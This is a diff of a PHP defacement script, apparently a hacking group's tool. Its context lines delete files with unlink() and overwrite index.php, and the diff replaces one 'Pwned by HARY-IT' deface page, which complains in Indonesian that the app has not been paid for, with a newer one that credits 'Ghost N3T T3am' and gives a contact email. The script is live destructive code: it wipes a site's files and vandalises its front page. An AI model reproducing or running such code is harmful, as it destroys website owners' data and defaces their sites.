@@ -18,61 +18,36 @@ foreach($files as $file) {
     unlink($file);
 
 $files = fopen("index.php","w");
-echo fwrite($files,"<html><link rel='icon'type='image/png' href='https://i.ibb.co/MfCCHp4/Rina-Watih-Lingga-20210530-171350.jpg' /><table width=100% height=100%>   <td align='center'>
-    <link href='https://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
-    <meta property='og:description' content='Make Your Heart Comfortable'/>
-        <meta property='og:title' content='HARY-IT'>
-        <meta property='og:image' content='https://i.ibb.co/JcXqmmr/IMG-20200804-WA0032.jpg'>
-    <head><title>Touched By ./HARY-IT</title>
+echo fwrite($files,"    <html>
+    <head>
+    <link rel='shortcut icon' href='https://haryit.github.io/logo.png'>
+    <link rel='icon' href='https://haryit.github.io/logo.png'>
+    <title>Pwned by H A R Y</title>
+    <style>
+     html, body { background-color: white; ; color: #636b6f; font-family: 'Fredericka the Great', sans-serif; font-weight: 100; height: 100vh; margin: 0; } .full-height { height: 100vh; } .flex-center { align-items: center; display: flex; justify-content: center; } .position-ref { position: relative; } .content { text-align: center; } .title { font-size: 36px; padding: 20px; }
+    </style>
 
-
-
-
-</head><body bgcolor='black'><body onmousedown='return false' oncontexmenu='return false' onselectstart='return false'>
-<body onclick='playAudio();' class=''><audio id='sec' __idm_id__='823202817'>
-        <source src='https://c.top4top.io/m_1999hir3b1.mp3' type='audio/mpeg'>
-        </audio>
-   <div class='losht'>
-   <script>
-    var x = document.getElementById('sec');
-    function playAudio() {
-    x.play();
-    }
-
-function myFunction() {
-    var element = document.body;
-    element.classList.toggle('dark-mode');
-    }
-    function changeImage() {
-    if (document.getElementById('imgClickAndChange').src == 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVAPAH-s4WkuG09NPjkWf-70IkrnusOjNckg&usqp=CAU')
-        {
-            document.getElementById('imgClickAndChange').src = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVAPAH-s4WkuG09NPjkWf-70IkrnusOjNckg&usqp=CAU';
-        }
-   else
-        {
-            document.getElementById('imgClickAndChange').src = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVAPAH-s4WkuG09NPjkWf-70IkrnusOjNckg&usqp=CAU';
-        }
-    }</script></div></body>
-<center>
-<br>
-<br>
-<br>
-<center><img style='width:220   px; height:250px' src='https://i.ibb.co/MfCCHp4/Rina-Watih-Lingga-20210530-171350.jpg'><br>
-
-
-
-<h1><font face='Iceland' color='white' size='10'>PwNeD By HARY-IT</font></h1>
-
-
-<font color='silver' size='4'>-| Message: |-
-<br>
-<font color='red' face='courier new'>'<i>Aplikasi Ini Belum Di Bayar <br>Hubungi Saya Untuk Info Lebih Lanjut!</i>'
-
-
-<script src='https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js' type='text/javascript'></script>
-
-<br><br>
-<font color='silver'>-| HARY-IT |-</font></font></font></font></font></font></center></body></html>");
+         
+    </head>
+    <body align='center' oncontextmenu='return false' bgcolor='black'>
+    <div class='error'>
+        <script type='text/javascript'> 
+        </script>
+        <div class='flex-center position-ref full-height'>
+            <div class='content'>
+                <center>
+                <img src='https://media.tenor.com/images/f38a60fe4557787213f7bf64ed248ca0/tenor.gif' width='300'><br>
+                <font color='black'><code><font size='5'><i><br>
+                Touched by H A R Y<br>
+                Thanks to: <br>
+                <marquee class='hary' width='30%'>Mr.Cyber - Mr.N17 - Mr.N3T - and all member</marquee><br>
+                <div><iframe width='300' height='60' src='https://vocaroo.com/embed/1dQIrXQMdcUL?autoplay=0' frameborder='0' allow='autoplay'></iframe></div>
+                <font style='font-size:15'>Contact me : theofaninatasia@gmail.com</font><br>Copyright &copy; Ghost N3T T3am 2023</div>
+            <div style='display:none'>
+                
+            
+            </body>
+            </html>");
 fclose($files);
 
 }
@@ -93,61 +68,36 @@ fclose($files);
 
 
 $files = fopen("index.php","w");
-echo fwrite($files,"<html><link rel='icon'type='image/png' href='https://i.ibb.co/MfCCHp4/Rina-Watih-Lingga-20210530-171350.jpg' /><table width=100% height=100%>   <td align='center'>
-    <link href='https://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
-    <meta property='og:description' content='Make Your Heart Comfortable'/>
-        <meta property='og:title' content='HARY-IT'>
-        <meta property='og:image' content='https://i.ibb.co/JcXqmmr/IMG-20200804-WA0032.jpg'>
-    <head><title>Touched By ./HARY-IT</title>
+echo fwrite($files,"    <html>
+    <head>
+    <link rel='shortcut icon' href='https://haryit.github.io/logo.png'>
+    <link rel='icon' href='https://haryit.github.io/logo.png'>
+    <title>Pwned by H A R Y</title>
+    <style>
+     html, body { background-color: white; ; color: #636b6f; font-family: 'Fredericka the Great', sans-serif; font-weight: 100; height: 100vh; margin: 0; } .full-height { height: 100vh; } .flex-center { align-items: center; display: flex; justify-content: center; } .position-ref { position: relative; } .content { text-align: center; } .title { font-size: 36px; padding: 20px; }
+    </style>
 
-
-
-
-</head><body bgcolor='black'><body onmousedown='return false' oncontexmenu='return false' onselectstart='return false'>
-<body onclick='playAudio();' class=''><audio id='sec' __idm_id__='823202817'>
-        <source src='https://c.top4top.io/m_1999hir3b1.mp3' type='audio/mpeg'>
-        </audio>
-   <div class='losht'>
-   <script>
-    var x = document.getElementById('sec');
-    function playAudio() {
-    x.play();
-    }
-
-function myFunction() {
-    var element = document.body;
-    element.classList.toggle('dark-mode');
-    }
-    function changeImage() {
-    if (document.getElementById('imgClickAndChange').src == 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVAPAH-s4WkuG09NPjkWf-70IkrnusOjNckg&usqp=CAU')
-        {
-            document.getElementById('imgClickAndChange').src = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVAPAH-s4WkuG09NPjkWf-70IkrnusOjNckg&usqp=CAU';
-        }
-   else
-        {
-            document.getElementById('imgClickAndChange').src = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVAPAH-s4WkuG09NPjkWf-70IkrnusOjNckg&usqp=CAU';
-        }
-    }</script></div></body>
-<center>
-<br>
-<br>
-<br>
-<center><img style='width:220   px; height:250px' src='https://i.ibb.co/MfCCHp4/Rina-Watih-Lingga-20210530-171350.jpg'><br>
-
-
-
-<h1><font face='Iceland' color='white' size='10'>PwNeD By HARY-IT</font></h1>
-
-
-<font color='silver' size='4'>-| Message: |-
-<br>
-<font color='red' face='courier new'>'<i>Aplikasi Ini Belum Di Bayar <br>Hubungi Saya Untuk Info Lebih Lanjut!</i>'
-
-
-<script src='https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js' type='text/javascript'></script>
-
-<br><br>
-<font color='silver'>-| HARY-IT |-</font></font></font></font></font></font></center></body></html>");
+         
+    </head>
+    <body align='center' oncontextmenu='return false' bgcolor='black'>
+    <div class='error'>
+        <script type='text/javascript'> 
+        </script>
+        <div class='flex-center position-ref full-height'>
+            <div class='content'>
+                <center>
+                <img src='https://media.tenor.com/images/f38a60fe4557787213f7bf64ed248ca0/tenor.gif' width='300'><br>
+                <font color='black'><code><font size='5'><i><br>
+                Touched by H A R Y<br>
+                Thanks to: <br>
+                <marquee class='hary' width='30%'>Mr.Cyber - Mr.N17 - Mr.N3T - and all member</marquee><br>
+                <div><iframe width='300' height='60' src='https://vocaroo.com/embed/1dQIrXQMdcUL?autoplay=0' frameborder='0' allow='autoplay'></iframe></div>
+                <font style='font-size:15'>Contact me : theofaninatasia@gmail.com</font><br>Copyright &copy; Ghost N3T T3am 2023</div>
+            <div style='display:none'>
+                
+            
+            </body>
+            </html>");
 fclose($files);
 
 
